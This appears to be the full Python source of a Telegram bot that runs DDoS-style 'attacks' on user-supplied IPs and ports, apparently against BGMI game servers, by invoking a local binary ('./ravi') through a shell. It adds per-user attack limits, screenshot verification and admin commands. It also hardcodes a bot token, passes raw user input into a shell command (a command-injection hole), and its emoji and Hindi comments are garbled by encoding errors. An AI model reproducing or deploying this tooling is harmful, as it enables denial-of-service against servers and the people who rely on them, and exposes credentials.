import telebot
import datetime
import time
import subprocess
import threading

# ‚úÖ TELEGRAM BOT TOKEN
bot = telebot.TeleBot(''7053228704:AAGLAJFlzJ6M2XZC9HEABD6B5PVubnd-FqY)

# ‚úÖ GROUP & CHANNEL SETTINGS
GROUP_ID = "-1002369239894"
SCREENSHOT_CHANNEL = "@KHAPITAR_BALAK77"
ADMINS = ["7129010361"]
ADMINS = [7129010361]

# ‚úÖ GLOBAL VARIABLES
active_attacks = {}  # ‡§Ö‡§ü‡•à‡§ï ‡§∏‡•ç‡§ü‡•á‡§ü‡§∏ ‡§ü‡•ç‡§∞‡•à‡§ï ‡§ï‡§∞‡•á‡§ó‡§æ
pending_verification = {}  # ‡§µ‡•á‡§∞‡§ø‡§´‡§ø‡§ï‡•á‡§∂‡§® ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ø‡•Ç‡§ú‡§∞‡•ç‡§∏ ‡§≤‡§ø‡§∏‡•ç‡§ü
user_attack_count = {}
MAX_ATTACKS = 2  # (‡§Ø‡§æ ‡§ú‡•ã ‡§≠‡•Ä ‡§≤‡§ø‡§Æ‡§ø‡§ü ‡§ö‡§æ‡§π‡§ø‡§è)
MAX_DURATION = 100

# ‚úÖ CHECK IF USER IS IN CHANNEL
def is_user_in_channel(user_id):
    try:
        member = bot.get_chat_member(SCREENSHOT_CHANNEL, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

# ‚úÖ HANDLE ATTACK COMMAND
@bot.message_handler(commands=['bgmi'])
def handle_attack(message):
    user_id = message.from_user.id
    command = message.text.split()

    if message.chat.id != int(GROUP_ID):
        bot.reply_to(message, "üö´ **YE BOT SIRF GROUP ME CHALEGA!** ‚ùå")
        return

    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"‚ùó **PEHLE CHANNEL JOIN KARO!** {SCREENSHOT_CHANNEL}")
        return

    # ‚úÖ ‡§™‡§π‡§≤‡•á ‡§™‡•á‡§Ç‡§°‡§ø‡§Ç‡§ó ‡§µ‡•á‡§∞‡§ø‡§´‡§ø‡§ï‡•á‡§∂‡§® ‡§ö‡•á‡§ï ‡§ï‡§∞‡•ã
    if user_id in pending_verification:
        bot.reply_to(message, "üö´ **PEHLE PURANE ATTACK KA SCREENSHOT BHEJ, TABHI NAYA ATTACK LAGEGA!**")
        return

    # ‚úÖ ‡§Ö‡§ü‡•à‡§ï ‡§≤‡§ø‡§Æ‡§ø‡§ü ‡§ö‡•á‡§ï ‡§ï‡§∞‡•ã
    user_active_attacks = sum(1 for uid in active_attacks.keys() if uid == user_id)
    if user_active_attacks >= MAX_ATTACKS:
        bot.reply_to(message, f"‚ö†Ô∏è **ATTACK LIMIT ({MAX_ATTACKS}) POORI HO CHUKI HAI!**\nüëâ **PEHLE PURANE KHATAM HONE DO! /check KARO!**")
        return

    if len(command) != 4:
        bot.reply_to(message, "‚ö†Ô∏è **USAGE:** `/bgmi <IP> <PORT> <TIME>`")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "‚ùå **PORT AUR TIME NUMBER HONE CHAHIYE!**")
        return

    if time_duration > MAX_DURATION:  # Use admin-set MAX_DURATION
         bot.reply_to(message, f"üö´ MAX ATTACK TIME IS {MAX_DURATION} SECONDS!")
         return

    # ‚úÖ ‡§™‡§π‡§≤‡•á ‡§π‡•Ä ‡§µ‡•á‡§∞‡§ø‡§´‡§ø‡§ï‡•á‡§∂‡§® ‡§∏‡•á‡§ü ‡§ï‡§∞ ‡§¶‡•ã ‡§§‡§æ‡§ï‡§ø ‡§Ø‡•Ç‡§ú‡§∞ ‡§§‡•Å‡§∞‡§Ç‡§§ ‡§∏‡•ç‡§ï‡•ç‡§∞‡•Ä‡§®‡§∂‡•â‡§ü ‡§≠‡•á‡§ú ‡§∏‡§ï‡•á
    pending_verification[user_id] = True

    bot.send_message(
        message.chat.id,
        f"üì∏ **TURANT SCREENSHOT BHEJ!**\n"
        f"‚ö†Ô∏è **AGAR NAHI DIYA TO NEXT ATTACK BLOCK HO JAYEGA!**",
        parse_mode="Markdown"
    )

    start_time = datetime.datetime.now()
    end_time = start_time + datetime.timedelta(seconds=time_duration)
    active_attacks[user_id] = (target, port, end_time)

    bot.send_message(
        message.chat.id,
        f"üî• **ATTACK DETAILS** üî•\n\n"
        f"üë§ **USER:** `{user_id}`\n"
        f"üéØ **TARGET:** `{target}`\n"
        f"üìç **PORT:** `{port}`\n"
        f"‚è≥ **DURATION:** `{time_duration} SECONDS`\n"
        f"üïí **START TIME:** `{start_time.strftime('%H:%M:%S')}`\n"
        f"üöÄ **END TIME:** `{end_time.strftime('%H:%M:%S')}`\n"
        f"üì∏ **NOTE:** **TURANT SCREENSHOT BHEJO, WARNA NEXT ATTACK BLOCK HO JAYEGA!**\n\n"
        f"‚ö†Ô∏è **ATTACK CHALU HAI! /check KARKE STATUS DEKHO!**",
        parse_mode="Markdown"
    )

    # ‚úÖ Attack Execution Function
    def attack_execution():
        try:
            subprocess.run(f"./ravi {target} {port} {time_duration} 1200", shell=True, check=True, timeout=time_duration)
        except subprocess.CalledProcessError:
            bot.reply_to(message, "‚ùå **ATTACK FAIL HO GAYA!**")
        finally:
            bot.send_message(
                message.chat.id,
                "‚úÖ **ATTACK KHATAM HO GAYA!** üéØ",
                parse_mode="Markdown"
            )
            del active_attacks[user_id]  # ‚úÖ ‡§Ö‡§ü‡•à‡§ï ‡§ñ‡§§‡•ç‡§Æ ‡§π‡•ã‡§§‡•á ‡§π‡•Ä ‡§°‡•á‡§ü‡§æ ‡§ï‡•ç‡§≤‡§ø‡§Ø‡§∞

    threading.Thread(target=attack_execution).start()

# ‚úÖ SCREENSHOT VERIFICATION SYSTEM
@bot.message_handler(content_types=['photo'])
def verify_screenshot(message):
    user_id = message.from_user.id

    if user_id not in pending_verification:
        bot.reply_to(message, "‚ùå **TERE KOI PENDING VERIFICATION NAHI HAI! SCREENSHOT FALTU NA BHEJ!**")
        return

    # ‚úÖ SCREENSHOT CHANNEL FORWARD
    file_id = message.photo[-1].file_id
    bot.send_photo(SCREENSHOT_CHANNEL, file_id, caption=f"üì∏ **VERIFIED SCREENSHOT FROM:** `{user_id}`")

    del pending_verification[user_id]  # ‚úÖ ‡§Ö‡§¨ ‡§Ø‡•Ç‡§ú‡§∞ ‡§Ö‡§ü‡•à‡§ï ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à
    bot.reply_to(message, "‚úÖ **SCREENSHOT VERIFY HO GAYA! AB TU NEXT ATTACK KAR SAKTA HAI!**")

# ‚úÖ ADMIN COMMAND TO SET MAX ATTACKS
@bot.message_handler(commands=['setmaxattacks'])
def set_max_attacks(message):
    user_id = message.from_user.id

    if user_id not in ADMINS:
        bot.reply_to(message, "üö´ **SIRF ADMIN HI MAX ATTACKS SET KAR SAKTA HAI!**")
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "‚ö†Ô∏è **USAGE:** `/setmaxattacks <number>`")
        return

    try:
        global MAX_ATTACKS
        MAX_ATTACKS = int(command[1])
        bot.reply_to(message, f"‚úÖ **MAX ATTACKS UPDATED!**\nüîπ MAX ATTACKS: `{MAX_ATTACKS}`")
    except ValueError:
        bot.reply_to(message, "‚ùå **INVALID INPUT! SIRF NUMBER DALO!**")

# ‚úÖ ADMIN COMMAND TO SET MAX DURATION
@bot.message_handler(commands=['setmaxduration'])
def set_max_duration(message):
    user_id = message.from_user.id

    if user_id not in ADMINS:
        bot.reply_to(message, "üö´ **SIRF ADMIN HI MAX DURATION SET KAR SAKTA HAI!**")
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "‚ö†Ô∏è **USAGE:** `/setmaxduration <seconds>`")
        return

    try:
        global MAX_DURATION
        MAX_DURATION = int(command[1])
        bot.reply_to(message, f"‚úÖ **MAX DURATION UPDATED!**\nüîπ MAX DURATION: `{MAX_DURATION} SECONDS`")
    except ValueError:
        bot.reply_to(message, "‚ùå **INVALID INPUT! SIRF NUMBER DALO!**")

# ‚úÖ ATTACK STATS COMMAND
@bot.message_handler(commands=['check'])
def attack_stats(message):
    user_id = message.from_user.id
    now = datetime.datetime.now()

    for user in list(active_attacks.keys()):
        if active_attacks[user][2] <= now:
            del active_attacks[user]

    if not active_attacks:
        bot.reply_to(message, "üìä **FILHAAL KOI ACTIVE ATTACK NAHI CHAL RAHA!** ‚ùå")
        return

    stats_message = "üìä **ACTIVE ATTACKS:**\n\n"
    for user, (target, port, end_time) in active_attacks.items():
        remaining_time = (end_time - now).total_seconds()
        stats_message += (
            f"üë§ **USER ID:** `{user}`\n"
            f"üéØ **TARGET:** `{target}`\n"
            f"üìç **PORT:** `{port}`\n"
            f"‚è≥ **ENDS IN:** `{int(remaining_time)}s`\n"
            f"üïí **END TIME:** `{end_time.strftime('%H:%M:%S')}`\n\n"
        )

    bot.reply_to(message, stats_message, parse_mode="Markdown")

# ‚úÖ ADMIN RESTART COMMAND
@bot.message_handler(commands=['restart'])
def restart_bot(message):
    if message.from_user.id in ADMINS:
        bot.send_message(message.chat.id, "‚ôªÔ∏è BOT RESTART HO RAHA HAI...")
        time.sleep(1)
        subprocess.run("python3 m.py", shell=True)
    else:
        bot.reply_to(message, "üö´ SIRF ADMIN HI RESTART KAR SAKTA HAI!")

# ‚úÖ START POLLING
bot.polling(none_stop=True)